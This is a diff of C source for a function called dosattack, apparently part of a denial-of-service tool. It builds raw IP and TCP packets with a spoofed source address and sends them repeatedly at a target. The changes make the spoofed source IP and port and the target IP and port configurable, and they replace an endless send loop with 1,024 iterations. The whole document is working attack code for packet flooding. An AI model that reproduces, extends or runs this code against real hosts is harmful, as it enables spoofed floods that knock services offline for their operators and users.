@@ -74,12 +74,14 @@ void dosattack(const struct AHTTP_INPUT *ainput)
     struct sockaddr_in sin;
     struct pseudo_header psh;
 
-    strcpy(source_ip, "192.168.1.1");
+    strcpy(source_ip, ptmp->SrcIP);
+    //strcpy(source_ip, "192.168.1.1");
 
     sin.sin_family = AF_INET;
-    sin.sin_port = htons(80);
+    sin.sin_port = htons((int)ptmp->DstPort);
+    //sin.sin_port = htons(80);
     // Target
-    sin.sin_addr.s_addr = inet_addr(ptmp->IP);
+    sin.sin_addr.s_addr = inet_addr(ptmp->DstIP);
     //sin.sin_addr.s_addr = inet_addr("1.2.3.4");
 
     // Zero out the buffer
@@ -105,9 +107,11 @@ void dosattack(const struct AHTTP_INPUT *ainput)
     iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);
 
     // TCP Header
-    tcph->source = htons(3306);
+    tcph->source = htons((int)ptmp->SrcPort);
+    //tcph->source = htons(3306);
     //tcph->source = htons(1234);
-    tcph->dest = htons(80);
+    tcph->dest = htons((int)ptmp->DstPort);
+    //tcph->dest = htons(80);
     tcph->seq = 0;
     tcph->ack_seq = 0;
     // First and only tcp segment
@@ -160,7 +164,8 @@ void dosattack(const struct AHTTP_INPUT *ainput)
     //Send the packet
     if (ptmp->MaxLoop == -1)
     {
-        for (;;)
+        int l;
+        for (l = 0; l < 1024; ++l)
         {
             if (sendto(
                     socket_fd,               // our socket
